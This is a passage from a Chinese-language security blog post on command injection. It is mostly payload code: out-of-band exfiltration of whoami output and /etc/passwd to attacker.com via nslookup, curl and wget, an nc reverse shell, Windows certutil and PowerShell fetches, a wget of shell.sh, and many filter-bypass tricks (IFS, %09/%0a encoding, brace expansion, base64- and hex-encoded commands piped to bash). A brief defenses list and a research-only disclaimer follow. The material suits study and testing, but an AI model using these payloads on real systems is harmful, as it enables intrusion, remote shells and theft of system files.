+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础 DNS 探测（确认命令执行）</span></span><br><span class="line">nslookup $(<span class="built_in">whoami</span>).attacker.com</span><br><span class="line">ping -c 1 $(<span class="built_in">id</span>).attacker.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用反引号绕过过滤</span></span><br><span class="line">nslookup `<span class="built_in">whoami</span>`.attacker.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 外带文件内容（注意 DNS 标签长度限制）</span></span><br><span class="line">nslookup $(<span class="built_in">cat</span> /etc/hostname|<span class="built_in">base32</span>|<span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span>).attacker.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>HTTP 外带：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># curl 外带</span></span><br><span class="line">curl http://attacker.com/$(<span class="built_in">whoami</span>)</span><br><span class="line">curl http://attacker.com/?data=$(<span class="built_in">cat</span> /etc/passwd|<span class="built_in">base64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wget 外带</span></span><br><span class="line">wget http://attacker.com/$(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># nc 反弹（需要目标有 nc）</span></span><br><span class="line">nc attacker.com 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows 环境下的外带：</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># certutil</span><br><span class="line">certutil -urlcache -split -f http://attacker.com/test.txt</span><br><span class="line"></span><br><span class="line"># PowerShell</span><br><span class="line">powershell -c &quot;Invoke-WebRequest http://attacker.com/$(whoami)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-利用写文件检测"><a href="#3-3-利用写文件检测" class="headerlink" title="3.3 利用写文件检测"></a>3.3 利用写文件检测</h3><p>将命令输出写入 Web 可访问目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入静态目录</span></span><br><span class="line"><span class="built_in">id</span> &gt; /var/www/html/output.txt</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd &gt; /var/www/upload/result.txt</span><br><span class="line"><span class="built_in">pwd</span> &gt; /tmp/out;<span class="built_in">cp</span> /tmp/out /var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认文件可访问</span></span><br><span class="line">curl http://target.com/output.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、空格过滤绕过"><a href="#四、空格过滤绕过" class="headerlink" title="四、空格过滤绕过"></a>四、空格过滤绕过</h2><p>空格是最常被过滤的字符之一。当 WAF 或应用层过滤去除空格时，以下技巧可以实现绕过。</p>
+<h3 id="4-1-IFS（内部域分隔符）"><a href="#4-1-IFS（内部域分隔符）" class="headerlink" title="4.1 IFS（内部域分隔符）"></a>4.1 IFS（内部域分隔符）</h3><p>在 Bash 中，<code>$IFS</code> 默认包含空格、制表符和换行符，可以用作空格替代：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本用法</span></span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/etc/passwd</span><br><span class="line"><span class="built_in">ls</span><span class="variable">$&#123;IFS&#125;</span>-la</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配合花括号（防止变量名粘连）</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,/etc/passwd&#125;</span><br><span class="line">&#123;<span class="built_in">ls</span>,-la,/tmp&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># IFS 配合制表符定义</span></span><br><span class="line">IFS=$<span class="string">&#x27;\t&#x27;</span>&amp;&amp;<span class="built_in">cat</span>&lt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>$IFS$9</code> 技巧：<code>$9</code> 是一个空位置参数，附加在 IFS 后可以安全分隔后续字符，避免变量名粘连：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9</span>/etc/passwd</span><br><span class="line"><span class="built_in">ls</span>$IFS<span class="variable">$9</span>-al</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-制表符与-URL-编码"><a href="#4-2-制表符与-URL-编码" class="headerlink" title="4.2 制表符与 URL 编码"></a>4.2 制表符与 URL 编码</h3><p>在 HTTP 请求中，可以使用 URL 编码字符替代空格：</p>
+<table>
+<thead>
+<tr>
+<th>编码</th>
+<th>字符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%09</code></td>
+<td>制表符 (Tab)</td>
+<td>最常用的空格替代，兼容性好</td>
+</tr>
+<tr>
+<td><code>%0a</code></td>
+<td>换行符 (LF)</td>
+<td>可终止当前命令并开始新命令</td>
+</tr>
+<tr>
+<td><code>%0d%0a</code></td>
+<td>回车换行 (CRLF)</td>
+<td>Windows 风格换行</td>
+</tr>
+<tr>
+<td><code>%0b</code></td>
+<td>垂直制表符</td>
+<td>少数环境有效</td>
+</tr>
+<tr>
+<td><code>%0c</code></td>
+<td>换页符</td>
+<td>少数环境有效</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 请求中使用 %09</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1%09%26%09id</span><br><span class="line"><span class="comment"># 实际执行：127.0.0.1 &amp; id (制表符分隔)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 请求中使用 %0a</span></span><br><span class="line">POST /exec.php</span><br><span class="line">cmd=<span class="built_in">cat</span>%0a/etc/passwd</span><br><span class="line"><span class="comment"># 实际执行：cat\n/etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合使用</span></span><br><span class="line">ip=127.0.0.1%0aid%0a|%0awhoami</span><br></pre></td></tr></table></figure>
+
+<p><code>%0a</code> 换行注入的原理：换行符在 Bash 中可视为命令分割符&#x2F;参数结束符。如果输入被直接拼接到命令行，换行可以断开原有命令上下文：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原始代码意图</span></span><br><span class="line">system(<span class="string">&quot;echo Input: &quot;</span> . <span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入 input=%0aid%0a</span></span><br><span class="line"><span class="comment"># 实际执行的命令变成：</span></span><br><span class="line"><span class="built_in">echo</span> Input: </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="comment"># 换行后 id 成为独立的命令</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-花括号扩展"><a href="#4-3-花括号扩展" class="headerlink" title="4.3 花括号扩展"></a>4.3 花括号扩展</h3><p>Bash 的花括号扩展机制可以不使用空格来构造命令和参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础用法</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,/etc/passwd&#125;</span><br><span class="line">&#123;<span class="built_in">ls</span>,-la,/tmp&#125;</span><br><span class="line">&#123;<span class="built_in">echo</span>,<span class="built_in">test</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连续多个命令</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,/etc/passwd&#125;;&#123;<span class="built_in">id</span>&#125;;&#123;<span class="built_in">whoami</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-重定向符技巧"><a href="#4-4-重定向符技巧" class="headerlink" title="4.4 重定向符技巧"></a>4.4 重定向符技巧</h3><p>利用输入重定向也可以绕过空格限制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 &lt; 和 &lt;&gt; 读取文件</span></span><br><span class="line"><span class="built_in">cat</span>&lt;/etc/passwd</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合使用</span></span><br><span class="line"><span class="built_in">id</span>&gt;output</span><br><span class="line"><span class="built_in">cat</span>&lt;output</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-5-其他绕过方式"><a href="#4-5-其他绕过方式" class="headerlink" title="4.5 其他绕过方式"></a>4.5 其他绕过方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 X=$ 和 eval</span></span><br><span class="line">X=$<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>&amp;&amp;<span class="built_in">eval</span><span class="variable">$X</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 printf 构造空格</span></span><br><span class="line"><span class="built_in">cat</span>$(<span class="built_in">printf</span> <span class="string">&#x27;\x20&#x27;</span>)/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用环境变量</span></span><br><span class="line">IFS=<span class="string">&quot;,&quot;</span>;a=<span class="built_in">cat</span>,/etc/passwd;<span class="variable">$a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通配符与问号</span></span><br><span class="line">/bin/c?t /etc/passwd</span><br><span class="line">/???/c?t /???/???????</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、综合绕过示例"><a href="#五、综合绕过示例" class="headerlink" title="五、综合绕过示例"></a>五、综合绕过示例</h2><p>实际渗透中往往需要组合多种技术绕过 WAF：</p>
+<p><strong>场景一：空格 + 分号被过滤</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 %0a 替代分号，%09 替代空格</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1%0awget%09http://attacker.com/shell.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景二：空格被过滤，目标为 Windows</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用 %<span class="number">0</span>a 和制表符</span><br><span class="line"><span class="built_in">ping</span><span class="variable">%09-n%</span><span class="number">095</span><span class="variable">%09127.0.0.1%</span><span class="number">0</span>awhoami</span><br><span class="line"></span><br><span class="line"># 使用 <span class="built_in">cmd</span>.exe 的括号特性</span><br><span class="line"><span class="built_in">cmd</span>.exe<span class="variable">%09/c%</span><span class="number">09</span>(whoami)</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景三：多关键字过滤</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat 被过滤 → 使用替代命令</span></span><br><span class="line">more /etc/passwd</span><br><span class="line">less /etc/passwd</span><br><span class="line"><span class="built_in">tac</span> /etc/passwd</span><br><span class="line"><span class="built_in">head</span> -n100 /etc/passwd</span><br><span class="line"><span class="built_in">tail</span> -n100 /etc/passwd</span><br><span class="line"><span class="built_in">nl</span> /etc/passwd</span><br><span class="line">rev /etc/passwd|rev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 base64 编码绕过</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9ldGMvcGFzc3dk&quot;</span>|<span class="built_in">base64</span> -d|bash</span><br><span class="line"><span class="comment"># 解码后：cat /etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用十六进制</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span>|bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用通配符绕过关键字</span></span><br><span class="line">/bin/c?t /etc/passw?</span><br><span class="line">/bin/c[a]t /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景四：利用环境变量混淆</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PATH 变量中提取字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:0:1&#125;</span>           <span class="comment"># 输出 /</span></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:14:1&#125;</span>    <span class="comment"># 构造 cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用未定义的变量</span></span><br><span class="line"><span class="variable">$a</span> /etc<span class="variable">$u</span>/passwd<span class="variable">$u</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="六、防御措施简述"><a href="#六、防御措施简述" class="headerlink" title="六、防御措施简述"></a>六、防御措施简述</h2><ol>
+<li><strong>避免直接调用系统命令</strong> — 优先使用编程语言的 API 或库函数</li>
+<li><strong>白名单校验</strong> — 对输入值进行严格的白名单匹配</li>
+<li><strong>参数化调用</strong> — 使用参数数组而非字符串拼接（如 <code>execve</code>）</li>
+<li><strong>转义特殊字符</strong> — 至少转义 <code>;&amp;|$()</code>{}&lt;&gt; 等元字符</li>
+<li><strong>最小权限原则</strong> — 应用进程以最低权限运行，限制可执行命令范围</li>
+<li><strong>WAF 规则</strong> — 在 WAF 层配置命令注入检测规则</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Command_Injection">OWASP Command Injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">PayloadsAllTheThings - Command Injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/command-injection">HackTricks - Command Injection</a></li>
+</ul>
+<hr>
+<p><em>本文仅供安全研究与教学目的，请遵守当地法律法规。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Tools-Burp-Suite-advanced/" rel="prev" title="Burp Suite高级技巧与插件">
+                  <i class="fa fa-angle-left"></i> Burp Suite高级技巧与插件
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Command-injection-bypass/" rel="next" title="命令注入绕过技巧汇总">
+                  命令注入绕过技巧汇总 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
